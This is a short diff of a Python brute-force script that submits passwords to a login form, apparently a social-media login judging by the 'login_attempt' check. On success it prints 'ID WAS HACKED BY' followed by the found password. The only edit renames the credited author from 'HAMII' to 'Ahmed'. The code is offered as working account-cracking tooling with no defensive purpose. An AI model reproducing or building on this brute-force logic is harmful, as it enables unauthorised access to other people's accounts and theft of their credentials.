@@ -86,7 +86,7 @@ def brute(password):
     sub = br.submit()
     log = sub.geturl()
     if log != login and (not 'login_attempt' in log):
-        print("\033[36;1m[\033[33;1m+\033[36;1m] \033[37;1mID WAS HACKED BY HAMII => \033[32;1m{}".format(password))
+        print("\033[36;1m[\033[33;1m+\033[36;1m] \033[37;1mID WAS HACKED BY Ahmed => \033[32;1m{}".format(password))
         raw_input("\033[31;1mANY KEY to Exit....")
         exit(1)
 
